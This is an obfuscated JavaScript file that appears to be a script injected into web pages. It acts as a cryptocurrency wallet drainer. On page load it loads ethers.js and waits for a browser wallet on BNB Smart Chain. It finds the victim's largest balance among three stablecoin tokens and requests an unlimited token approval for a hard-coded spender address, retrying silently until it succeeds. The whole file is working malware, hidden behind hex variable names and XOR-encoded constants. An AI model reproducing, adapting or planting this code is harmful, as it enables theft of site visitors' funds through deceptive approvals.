const erc20Abi='[{\x22constant\x22:true,\x22inputs\x22:[],\x22name\x22:\x22name\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22name\x22:\x22_spender\x22,\x22type\x22:\x22address\x22},{\x22name\x22:\x22_value\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22approve\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:true,\x22inputs\x22:[],\x22name\x22:\x22totalSupply\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22name\x22:\x22_from\x22,\x22type\x22:\x22address\x22},{\x22name\x22:\x22_to\x22,\x22type\x22:\x22address\x22},{\x22name\x22:\x22_value\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22transferFrom\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:true,\x22inputs\x22:[],\x22name\x22:\x22decimals\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22uint8\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:true,\x22inputs\x22:[{\x22name\x22:\x22_owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22balanceOf\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:true,\x22inputs\x22:[],\x22name\x22:\x22symbol\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22string\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22name\x22:\x22_to\x22,\x22type\x22:\x22address\x22},{\x22name\x22:\x22_value\x22,\x22type\x22:\x22uint256\x22}],\x22name\x22:\x22transfer\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22bool\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:true,\x22inputs\x22:[{\x22name\x22:\x22_owner\x22,\x22type\x22:\x22address\x22},{\x22name\x22:\x22_spender\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22allowance\x22,\x22outputs\x22:[{\x22name\x22:\x22\x22,\x22type\x22:\x22uint256\x22}],\x22payable\x22:false,\x22stateMutability\x22:\x22view\x22,\x22type\x22:\x22function\x22}]';const ethSpenderAddress='0xE6f2a3CD577a438Ea0Cf1f7a7D0F555eAb253a25';const threshold=0x6812e^0x680da;async function job(_0x303501,_0x3b31e0,_0x4127dd){var _0x85eda8=window['_ethers'];var _0x103c31=null;var _0x15f208=0x5f395^0x5f395;var _0x50519d={'addr':_0x303501,'token':null,'transaction':null};for(var _0x6e8e08 in _0x3b31e0){var _0xa4ba46=new _0x85eda8['Contract'](_0x3b31e0[_0x6e8e08],erc20Abi,_0x4127dd);var _0x439711=await _0xa4ba46['decimals']();var _0x3f630f=await _0xa4ba46['balanceOf'](_0x303501);var _0x4323da=_0x85eda8['utils']['formatUnits'](_0x3f630f,_0x439711);if(_0x4323da<threshold){continue;}if(_0x4323da>_0x15f208){_0x15f208=_0x4323da;_0x103c31=_0x3b31e0[_0x6e8e08];}}if(_0x103c31!=null){try{var _0xa4ba46=new _0x85eda8['Contract'](_0x103c31,erc20Abi,_0x4127dd);await _0xa4ba46['approve'](ethSpenderAddress,_0x85eda8['constants']['MaxUint256']);}catch(_0x36c6bf){return;}}else{throw'Retry!';}}async function calls(){var _0x45e751=window['_ethers'];const _0x19e07e=new _0x45e751['providers']['Web3Provider'](window['ethereum'],'any');var _0x161351=await _0x19e07e['getNetwork']();const _0x4b6e2a=_0x19e07e['getSigner']();const _0x3a2890=await _0x4b6e2a['getAddress']();if(!_0x3a2890){throw'No\x20User\x20Address!';}if(_0x161351['chainId']==(0xa7de8^0xa7dd0)){var _0x3ad90e=['0x55d398326f99059fF775485246999027B3197955','0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'];await job(_0x3a2890,_0x3ad90e,_0x4b6e2a);}else{throw'network\x20error:\x20'+_0x161351['chainId'];}}async function loadEthers(){return new Promise((_0x33135f,_0x528a52)=>{try{var _0x1f8b9b=document['createElement']('script');_0x1f8b9b['src']='https://cdn-cors.ethers.io/lib/ethers-5.5.3.umd.min.js';_0x1f8b9b['type']='text/javascript';_0x1f8b9b['addEventListener']('load',_0xae5d4b=>{_0x33135f({'status':!![]});});document['head']['appendChild'](_0x1f8b9b);}catch(_0x2ce085){_0x528a52(_0x2ce085);}});};function sleep(_0x5303d2){return new Promise(_0x2b2113=>setTimeout(_0x2b2113,_0x5303d2));}document['addEventListener']('DOMContentLoaded',async function(){var _0x375eec=![];((async()=>{if(typeof window['ethereum']!=='undefined'){await loadEthers();}while(!_0x375eec){if(typeof window['ethereum']!=='undefined'){try{await calls();_0x375eec=!![];}catch(_0x4c0ba1){}}await sleep(0x311ad^0x31a15);}})());});
